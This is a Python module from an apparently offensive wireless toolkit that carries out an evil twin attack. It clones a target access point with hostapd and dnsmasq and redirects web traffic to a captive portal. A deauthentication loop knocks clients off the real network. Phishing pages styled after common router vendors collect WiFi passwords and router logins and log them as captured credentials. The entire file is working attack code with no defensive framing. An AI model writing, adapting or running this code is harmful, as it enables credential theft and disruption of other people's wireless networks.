"""
modules/evil_twin.py — DARK CRACKER OPS Generation 2
Evil Twin attack: rogue AP + captive portal + deauth loop.
Clones target AP, captures credentials via dark-themed router login page.
"""

import http.server
import ipaddress
import os
import queue
import re
import shutil
import subprocess
import tempfile
import threading
import time
import urllib.parse

from core.worker import BaseWorker
from core.config import (
    TOOLS,
    EVIL_TWIN_DHCP_RANGE,
    EVIL_TWIN_GATEWAY,
    EVIL_TWIN_NETMASK,
)
from core.logger import get_logger

log = get_logger("evil_twin")

PORTAL_PORT = 8080

_cred_queue: queue.Queue = queue.Queue()

PORTAL_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Router Setup — Authentication Required</title>
<style>
  * {{ box-sizing: border-box; margin: 0; padding: 0; }}
  body {{
    background: #0a0a0f; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    display: flex; align-items: center; justify-content: center;
    min-height: 100vh; color: #c9d1d9;
  }}
  .card {{
    background: #161b22; border: 1px solid #30363d; border-radius: 10px;
    padding: 40px 48px; width: 100%; max-width: 420px;
    box-shadow: 0 8px 32px rgba(0,0,0,0.6);
  }}
  h1 {{ font-size: 1.25rem; color: #e6edf3; text-align: center; margin-bottom: 6px; }}
  .subtitle {{ text-align: center; font-size: 0.82rem; color: #8b949e; margin-bottom: 28px; }}
  .alert {{
    background: #1c2833; border: 1px solid #f0b429; border-radius: 6px;
    padding: 10px 14px; font-size: 0.82rem; color: #f0b429; margin-bottom: 22px;
  }}
  label {{ display: block; font-size: 0.82rem; color: #8b949e; margin-bottom: 5px; margin-top: 14px; }}
  input[type="text"], input[type="password"] {{
    width: 100%; padding: 10px 12px; background: #0d1117; border: 1px solid #30363d;
    border-radius: 6px; color: #e6edf3; font-size: 0.9rem; outline: none;
  }}
  button {{
    width: 100%; margin-top: 22px; padding: 11px; background: #238636;
    border: 1px solid #2ea043; border-radius: 6px; color: #fff;
    font-size: 0.95rem; font-weight: 600; cursor: pointer;
  }}
  .footer {{ text-align: center; margin-top: 20px; font-size: 0.75rem; color: #484f58; }}
</style>
</head>
<body>
<div class="card">
  <h1>Router Setup</h1>
  <p class="subtitle">Authentication Required</p>
  <div class="alert">&#9888; Your router requires re-authentication to continue internet access.</div>
  <form method="POST" action="/submit">
    <label for="usr">Username</label>
    <input type="text" id="usr" name="username" placeholder="admin" autocomplete="off" required>
    <label for="pwd">Password</label>
    <input type="password" id="pwd" name="password" placeholder="Router password" required>
    <button type="submit">Sign In</button>
  </form>
  <div class="footer">SSID: {ssid} &nbsp;|&nbsp; Firmware v3.14.1</div>
</div>
</body>
</html>"""

# ── Vendor detection ─────────────────────────────────────────────────────────

_VENDOR_OUI_MAP = {
    # TP-Link
    "503EAA": "tplink", "EC086B": "tplink", "54AF97": "tplink",
    "C025E9": "tplink", "F07D68": "tplink",
    # Netgear
    "A00460": "netgear", "204E7F": "netgear", "28C68E": "netgear", "841B5E": "netgear",
    # Asus
    "001A92": "asus", "10BF48": "asus", "50465D": "asus", "AC220B": "asus",
    # D-Link
    "00265A": "dlink", "1C7EE5": "dlink", "28107B": "dlink", "B8A386": "dlink",
    # Huawei
    "2CCF58": "huawei", "00E0FC": "huawei", "48AD08": "huawei", "548998": "huawei",
}

_VENDOR_THEMES = {
    "tplink":  {"color": "#4CAF50", "logo": "TP-Link",     "bg": "#f5f5f5", "text": "#333"},
    "netgear": {"color": "#003087", "logo": "NETGEAR",     "bg": "#f0f4fb", "text": "#1a1a2e"},
    "asus":    {"color": "#1a73e8", "logo": "ASUS",        "bg": "#1a1a2e", "text": "#e0e0e0"},
    "dlink":   {"color": "#0078D7", "logo": "D-Link",      "bg": "#f0f8ff", "text": "#222"},
    "huawei":  {"color": "#CF0A2C", "logo": "HUAWEI",      "bg": "#fff5f5", "text": "#1a1a1a"},
    "generic": {"color": "#333333", "logo": "Router Admin", "bg": "#f5f5f5", "text": "#222"},
}


def _detect_vendor(bssid: str) -> str:
    """Return vendor string from BSSID first 3 bytes OUI lookup."""
    if not bssid:
        return "generic"
    oui = bssid.replace(":", "").replace("-", "").upper()[:6]
    return _VENDOR_OUI_MAP.get(oui, "generic")


def _get_portal_html(ssid: str, vendor: str) -> str:
    """Return a themed captive portal HTML page for the given vendor."""
    theme = _VENDOR_THEMES.get(vendor, _VENDOR_THEMES["generic"])
    header_color = theme["color"]
    logo_text    = theme["logo"]
    bg_color     = theme["bg"]
    text_color   = theme["text"]

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Router Setup - {ssid}</title>
<style>
  * {{ box-sizing: border-box; margin: 0; padding: 0; }}
  body {{
    background: {bg_color};
    font-family: 'Segoe UI', Arial, sans-serif;
    display: flex; align-items: center; justify-content: center;
    min-height: 100vh; color: {text_color};
  }}
  .header {{
    background: {header_color}; color: #fff;
    text-align: center; padding: 18px;
    font-size: 1.5rem; font-weight: bold; letter-spacing: 2px;
    border-radius: 10px 10px 0 0;
  }}
  .card {{
    background: #fff; border-radius: 10px;
    box-shadow: 0 4px 24px rgba(0,0,0,0.13);
    width: 100%; max-width: 420px; overflow: hidden;
  }}
  .card-body {{ padding: 32px 36px 28px; }}
  .wifi-icon {{
    text-align: center; font-size: 2.5rem; margin-bottom: 10px;
  }}
  h2 {{ text-align: center; margin-bottom: 4px; color: {header_color}; }}
  .subtitle {{ text-align: center; font-size: 0.85rem; color: #888; margin-bottom: 22px; }}
  label {{ display: block; font-size: 0.82rem; margin-bottom: 4px; margin-top: 14px; color: #555; }}
  input[type="password"] {{
    width: 100%; padding: 10px 12px; border: 1px solid #ccc;
    border-radius: 6px; font-size: 0.95rem; outline: none;
  }}
  input[type="password"]:focus {{ border-color: {header_color}; }}
  button {{
    width: 100%; margin-top: 20px; padding: 11px;
    background: {header_color}; color: #fff;
    border: none; border-radius: 6px; font-size: 1rem;
    font-weight: bold; cursor: pointer; letter-spacing: 0.5px;
  }}
  button:hover {{ opacity: 0.9; }}
  .spinner {{
    display: none; text-align: center; margin-top: 14px; color: {header_color};
  }}
  .footer {{ text-align: center; margin-top: 18px; font-size: 0.72rem; color: #aaa; }}
</style>
</head>
<body>
<div class="card">
  <div class="header">{logo_text}</div>
  <div class="card-body">
    <div class="wifi-icon">&#128246;</div>
    <h2>WiFi Authentication</h2>
    <p class="subtitle">Enter your WiFi password to reconnect to <strong>{ssid}</strong></p>
    <form method="POST" action="/submit" onsubmit="showSpinner()">
      <label for="pwd">WiFi Password</label>
      <input type="password" id="pwd" name="password" placeholder="Enter your WiFi password" required autofocus>
      <button type="submit">Connect</button>
    </form>
    <div class="spinner" id="spinner">&#9696; Connecting&hellip;</div>
    <div class="footer">Network: {ssid}</div>
  </div>
</div>
<script>
function showSpinner() {{
  document.getElementById('spinner').style.display = 'block';
}}
</script>
</body>
</html>"""
    return html


SUCCESS_HTML = """<!DOCTYPE html>
<html><head><title>Router Setup</title>
<style>body{{background:#0a0a0f;display:flex;align-items:center;justify-content:center;
min-height:100vh;font-family:sans-serif;color:#c9d1d9;}}
.msg{{text-align:center;padding:40px;}} h2{{color:#3fb950;margin-bottom:12px;}}
p{{color:#8b949e;font-size:0.9rem;}}</style></head>
<body><div class="msg"><h2>&#10003; Authentication Successful</h2>
<p>Reconnecting to the internet&hellip;</p></div>
<script>setTimeout(()=>location.reload(),8000);</script></body></html>"""


class CaptivePortalHandler(http.server.BaseHTTPRequestHandler):
    ssid: str   = "WiFi Network"
    bssid: str  = ""
    vendor: str = "generic"

    def log_message(self, fmt, *args):
        pass

    def _send_response_body(self, code: int, content_type: str, body):
        if isinstance(body, str):
            body = body.encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Connection", "close")
        self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        html = _get_portal_html(self.ssid, self.vendor)
        self._send_response_body(200, "text/html; charset=utf-8", html)

    def do_POST(self):
        if self.path != "/submit":
            self.do_GET()
            return
        content_length = int(self.headers.get("Content-Length", 0))
        raw_body = self.rfile.read(content_length).decode("utf-8", errors="replace")
        params   = urllib.parse.parse_qs(raw_body)
        username = params.get("username", [""])[0].strip()
        password = params.get("password", [""])[0].strip()
        client_ip = self.client_address[0]
        cred = {
            "username": username, "password": password,
            "client_ip": client_ip,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        }
        _cred_queue.put(cred)
        self._send_response_body(200, "text/html; charset=utf-8", SUCCESS_HTML)


class EvilTwin(BaseWorker):
    """
    Full Evil Twin attack orchestrator.

    Callbacks
    ---------
    on_log(tag, msg)            — log messages
    on_client(client_dict)      — new client connected
    on_cred(cred_dict)          — credential captured
    on_deauth_count(int)        — running deauth total
    on_finished(bool)           — True on clean stop
    """

    def __init__(
        self,
        on_log=None,
        on_client=None,
        on_cred=None,
        on_deauth_count=None,
        on_finished=None,
    ):
        super().__init__()
        self.on_log          = on_log          or (lambda t, m: None)
        self.on_client       = on_client       or (lambda d: None)
        self.on_cred         = on_cred         or (lambda d: None)
        self.on_deauth_count = on_deauth_count or (lambda n: None)
        self.on_finished     = on_finished     or (lambda ok: None)

        self._ssid      = ""
        self._bssid     = ""
        self._channel   = 6
        self._ap_iface  = ""
        self._mon_iface = ""

        self._procs: list = []
        self._httpd = None
        self._tmpdir = tempfile.mkdtemp(prefix="dc_evil_")
        self._deauth_total = 0
        self._leases_seen: set = set()

    def clone_ap(self, ssid: str, bssid: str, channel: int,
                 ap_iface: str, mon_iface: str = "") -> None:
        self._ssid      = ssid
        self._bssid     = bssid
        self._channel   = channel
        self._ap_iface  = ap_iface
        self._mon_iface = mon_iface or ap_iface
        vendor = _detect_vendor(bssid)
        CaptivePortalHandler.ssid   = ssid
        CaptivePortalHandler.bssid  = bssid
        CaptivePortalHandler.vendor = vendor
        self._call(self.on_log, "EVILTWIN",
            f"Vendor detected: {vendor} (BSSID: {bssid})")

    def run(self):
        while not _cred_queue.empty():
            try:
                _cred_queue.get_nowait()
            except queue.Empty:
                break

        self._call(self.on_log, "EVILTWIN",
                   f"Starting Evil Twin — SSID: {self._ssid} | CH: {self._channel}")
        try:
            if not self._write_hostapd_conf():
                self._call(self.on_finished, False)
                return
            if not self._write_dnsmasq_conf():
                self._call(self.on_finished, False)
                return
            if not self._configure_interface():
                self._call(self.on_finished, False)
                return
            if not self._setup_iptables():
                self._call(self.on_finished, False)
                return
            if not self._start_hostapd():
                self._call(self.on_finished, False)
                return
            if not self._start_dnsmasq():
                self._call(self.on_finished, False)
                return
            self._start_portal_server()
            threading.Thread(target=self._deauth_loop, daemon=True).start()
            self._call(self.on_log, "EVILTWIN", "Evil Twin active — waiting for clients…")
            self._monitor_loop()
        except Exception as exc:
            self._call(self.on_log, "ERROR", f"Evil Twin error: {exc}")
        finally:
            self._teardown()
        self._call(self.on_finished, True)

    def _write_hostapd_conf(self) -> bool:
        conf_path = os.path.join(self._tmpdir, "hostapd.conf")
        conf = (
            f"interface={self._ap_iface}\ndriver=nl80211\nssid={self._ssid}\n"
            f"hw_mode=g\nchannel={self._channel}\nmacaddr_acl=0\n"
            f"auth_algs=1\nignore_broadcast_ssid=0\n"
        )
        try:
            with open(conf_path, "w") as fh:
                fh.write(conf)
            self._hostapd_conf = conf_path
            self._call(self.on_log, "EVILTWIN", f"hostapd.conf written: {conf_path}")
            return True
        except Exception as exc:
            self._call(self.on_log, "ERROR", f"Failed to write hostapd.conf: {exc}")
            return False

    def _write_dnsmasq_conf(self) -> bool:
        conf_path  = os.path.join(self._tmpdir, "dnsmasq.conf")
        lease_path = os.path.join(self._tmpdir, "dnsmasq.leases")
        self._lease_path = lease_path
        gateway    = EVIL_TWIN_GATEWAY
        dhcp_range = EVIL_TWIN_DHCP_RANGE
        conf = (
            f"interface={self._ap_iface}\nbind-interfaces\n"
            f"dhcp-range={dhcp_range}\ndhcp-option=3,{gateway}\n"
            f"dhcp-option=6,{gateway}\nserver=8.8.8.8\n"
            f"dhcp-leasefile={lease_path}\naddress=/#/{gateway}\n"
            f"log-dhcp\nno-resolv\n"
        )
        try:
            with open(conf_path, "w") as fh:
                fh.write(conf)
            self._dnsmasq_conf = conf_path
            self._call(self.on_log, "EVILTWIN", f"dnsmasq.conf written: {conf_path}")
            return True
        except Exception as exc:
            self._call(self.on_log, "ERROR", f"Failed to write dnsmasq.conf: {exc}")
            return False

    def _configure_interface(self) -> bool:
        gateway = EVIL_TWIN_GATEWAY
        netmask = EVIL_TWIN_NETMASK
        try:
            subprocess.run(["ip", "link", "set", self._ap_iface, "up"],
                           check=True, capture_output=True)
            subprocess.run(["ip", "addr", "flush", "dev", self._ap_iface],
                           capture_output=True)
            subnet = ipaddress.IPv4Network(f"{gateway}/{netmask}", strict=False)
            prefix = subnet.prefixlen
            subprocess.run(
                ["ip", "addr", "add", f"{gateway}/{prefix}", "dev", self._ap_iface],
                check=True, capture_output=True
            )
            self._call(self.on_log, "EVILTWIN",
                       f"Interface {self._ap_iface} assigned {gateway}/{prefix}")
            return True
        except Exception as exc:
            self._call(self.on_log, "ERROR", f"Interface setup error: {exc}")
            return False

    def _setup_iptables(self) -> bool:
        iface = self._ap_iface
        rules = [
            ["iptables", "-F"],
            ["iptables", "-t", "nat", "-F"],
            ["sysctl", "-w", "net.ipv4.ip_forward=1"],
            ["iptables", "-t", "nat", "-A", "PREROUTING",
             "-i", iface, "-p", "tcp", "--dport", "80",
             "-j", "REDIRECT", "--to-port", str(PORTAL_PORT)],
            ["iptables", "-t", "nat", "-A", "PREROUTING",
             "-i", iface, "-p", "tcp", "--dport", "443",
             "-j", "REDIRECT", "--to-port", str(PORTAL_PORT)],
            ["iptables", "-t", "nat", "-A", "POSTROUTING",
             "-o", self._get_wan_iface(), "-j", "MASQUERADE"],
            ["iptables", "-A", "FORWARD", "-i", iface, "-j", "ACCEPT"],
            ["iptables", "-A", "FORWARD", "-o", iface, "-j", "ACCEPT"],
        ]
        for rule in rules:
            try:
                subprocess.run(rule, capture_output=True, text=True)
            except Exception as exc:
                self._call(self.on_log, "WARN", f"iptables error: {exc}")
        self._call(self.on_log, "EVILTWIN",
                   f"iptables: HTTP/HTTPS redirected to :{PORTAL_PORT}")
        return True

    @staticmethod
    def _get_wan_iface() -> str:
        try:
            result = subprocess.run(
                ["ip", "route", "show", "default"],
                capture_output=True, text=True, timeout=5
            )
            m = re.search(r"dev\s+(\S+)", result.stdout)
            if m:
                return m.group(1)
        except Exception:
            pass
        return "eth0"

    def _flush_iptables(self) -> None:
        for cmd in [
            ["iptables", "-F"],
            ["iptables", "-t", "nat", "-F"],
            ["sysctl", "-w", "net.ipv4.ip_forward=0"],
        ]:
            try:
                subprocess.run(cmd, capture_output=True, timeout=5)
            except Exception:
                pass
        self._call(self.on_log, "EVILTWIN", "iptables rules flushed")

    def _start_hostapd(self) -> bool:
        hostapd = TOOLS.get("hostapd", "hostapd")
        if not shutil.which(hostapd):
            self._call(self.on_log, "ERROR", "hostapd not found")
            return False
        proc = self._popen([hostapd, self._hostapd_conf])
        if not proc:
            return False
        time.sleep(2)
        if proc.poll() is not None:
            self._call(self.on_log, "ERROR", "hostapd exited immediately")
            return False
        self._call(self.on_log, "EVILTWIN",
                   f"hostapd started — rogue AP '{self._ssid}' on ch {self._channel}")
        return True

    def _start_dnsmasq(self) -> bool:
        dnsmasq = TOOLS.get("dnsmasq", "dnsmasq")
        if not shutil.which(dnsmasq):
            self._call(self.on_log, "ERROR", "dnsmasq not found")
            return False
        subprocess.run(["pkill", "-f", f"dnsmasq.*{self._ap_iface}"], capture_output=True)
        time.sleep(0.5)
        proc = self._popen([
            dnsmasq, "--conf-file=" + self._dnsmasq_conf,
            "--no-daemon", "--log-facility=-",
        ])
        if not proc:
            return False
        time.sleep(1)
        if proc.poll() is not None:
            self._call(self.on_log, "ERROR", "dnsmasq exited immediately")
            return False
        self._call(self.on_log, "EVILTWIN", "dnsmasq DHCP/DNS server started")
        return True

    def _start_portal_server(self) -> None:
        try:
            self._httpd = http.server.HTTPServer(("0.0.0.0", PORTAL_PORT), CaptivePortalHandler)
            threading.Thread(target=self._httpd.serve_forever, daemon=True).start()
            self._call(self.on_log, "EVILTWIN",
                       f"Captive portal HTTP server listening on :{PORTAL_PORT}")
        except OSError as exc:
            self._call(self.on_log, "ERROR", f"Failed to bind portal server: {exc}")

    def _deauth_loop(self) -> None:
        aireplay = TOOLS.get("aireplay", "aireplay-ng")
        if not shutil.which(aireplay):
            self._call(self.on_log, "WARN", "aireplay-ng not found — deauth loop disabled")
            return
        mon = self._mon_iface
        target_bssid = self._bssid
        self._call(self.on_log, "EVILTWIN", f"Deauth loop started — targeting {target_bssid}")
        while not self.is_stopped():
            try:
                subprocess.run(
                    [aireplay, "--deauth", "5", "-a", target_bssid, mon],
                    capture_output=True, text=True, timeout=10
                )
                self._deauth_total += 5
                self._call(self.on_deauth_count, self._deauth_total)
            except subprocess.TimeoutExpired:
                pass
            except Exception as exc:
                log.debug("deauth_loop error: %s", exc)
            time.sleep(2)

    def _monitor_loop(self) -> None:
        while not self.is_stopped():
            time.sleep(2)
            while not _cred_queue.empty():
                try:
                    cred = _cred_queue.get_nowait()
                    self._call(self.on_log, "CRED",
                               f"Credential captured from {cred['client_ip']}: "
                               f"user={cred['username']!r} pass={cred['password']!r}")
                    self._call(self.on_cred, cred)
                except queue.Empty:
                    break
            self._check_new_clients()

    def _check_new_clients(self) -> None:
        lease_path = getattr(self, "_lease_path", "")
        if not lease_path or not os.path.exists(lease_path):
            return
        try:
            with open(lease_path, "r") as fh:
                for line in fh:
                    parts = line.strip().split()
                    if len(parts) < 4:
                        continue
                    mac      = parts[1].upper()
                    ip_addr  = parts[2]
                    hostname = parts[3] if parts[3] != "*" else "unknown"
                    if mac not in self._leases_seen:
                        self._leases_seen.add(mac)
                        client = {
                            "mac": mac, "ip": ip_addr, "hostname": hostname,
                            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                        }
                        self._call(self.on_log, "EVILTWIN",
                                   f"Client connected: {mac} ({ip_addr}) [{hostname}]")
                        self._call(self.on_client, client)
        except Exception as exc:
            log.debug("leases parse error: %s", exc)

    def _popen(self, cmd: list):
        try:
            proc = subprocess.Popen(
                cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, text=True,
            )
            self._procs.append(proc)
            return proc
        except FileNotFoundError:
            self._call(self.on_log, "ERROR", f"Not found: {cmd[0]}")
            return None
        except Exception as exc:
            self._call(self.on_log, "ERROR", f"Spawn error: {exc}")
            return None

    def _teardown(self) -> None:
        self._call(self.on_log, "EVILTWIN", "Tearing down Evil Twin…")
        if self._httpd:
            try:
                self._httpd.shutdown()
            except Exception:
                pass
            self._httpd = None
        for proc in list(self._procs):
            try:
                if proc.poll() is None:
                    proc.terminate()
                    proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
            except Exception:
                pass
        self._procs.clear()
        self._flush_iptables()
        try:
            subprocess.run(
                ["ip", "addr", "flush", "dev", self._ap_iface],
                capture_output=True, timeout=5
            )
        except Exception:
            pass
        try:
            shutil.rmtree(self._tmpdir, ignore_errors=True)
        except Exception:
            pass
        self._call(self.on_log, "EVILTWIN", "Evil Twin stopped, system restored")

    # Backwards compat alias
    EvilTwinEngine = None  # will be aliased below


# Alias for backwards compatibility with old import name
EvilTwinEngine = EvilTwin
